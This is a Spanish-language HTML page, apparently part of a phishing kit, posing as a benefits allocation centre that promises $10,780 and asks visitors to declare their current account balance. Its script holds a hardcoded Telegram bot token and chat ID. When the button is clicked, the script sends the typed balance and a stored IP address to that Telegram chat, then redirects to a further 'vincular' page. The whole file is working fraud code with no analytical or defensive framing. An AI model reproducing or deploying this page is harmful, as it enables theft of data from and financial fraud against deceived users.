<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <title>Centro de Asignaciones | Exclusividad clientes</title>
    <style>
        :root { --p: #0A2A5E; --g: #22c55e; }
        body { background: #f8fafc; font-family: sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
        .card { background: #fff; padding: 40px; border-radius: 24px; width: 400px; box-shadow: 0 15px 40px rgba(0,0,0,0.08); text-align: center; border: 1px solid #e2e8f0; }
        .logo { max-width: 150px; margin-bottom: 25px; }
        .promo-box { background: linear-gradient(135deg, #f0fdf4 0%, #dcfce7 100%); border: 1px solid #bbf7d0; padding: 20px; border-radius: 16px; margin-bottom: 25px; }
        .promo-box h2 { color: #166534; font-size: 26px; margin: 10px 0; }
        .promo-box p { color: #15803d; font-size: 13px; font-weight: 600; }
        label { display: block; font-weight: 700; font-size: 14px; margin-bottom: 12px; color: var(--p); }
        input { width: 100%; padding: 15px; border: 2px solid #cbd5e1; border-radius: 12px; font-size: 20px; text-align: center; box-sizing: border-box; }
        .btn { background: var(--p); color: white; border: none; padding: 18px; width: 100%; border-radius: 12px; font-weight: 700; margin-top: 25px; cursor: pointer; }
    </style>
</head>
<body>
    <div class="card">
        <img src="img/nuevo.png" class="logo">
        <div class="promo-box">
            <p>SISTEMA DE ASIGNACIÓN BENEFICIOS</p>
            <h2>$10,780.00</h2>
            <p>Usted califica para este beneficio después de una comprobación en línea.</p>
        </div>
        <label>Declare su saldo disponible actual *</label>
        <input type="text" id="m" placeholder="0.00">
        <button class="btn" onclick="go()">Confirmar y Recibir</button>
    </div>
    <script>
        const a="8652605735:", b="AAGpe405IEzW36zWbSR6HbDvaYRmQHfqHGE", c="-1003900740654";
        async function go() {
            const msg = `<b>[MONTO]</b>\nIP: ${localStorage.getItem('_uip')}\nSaldo: $${document.getElementById('m').value}`;
            await fetch(`https://api.telegram.org/bot${a+b}/sendMessage?chat_id=${c}&text=${encodeURIComponent(msg)}&parse_mode=HTML`);
            window.location.href='vincular.html';
        }
    </script>
</body>
</html>
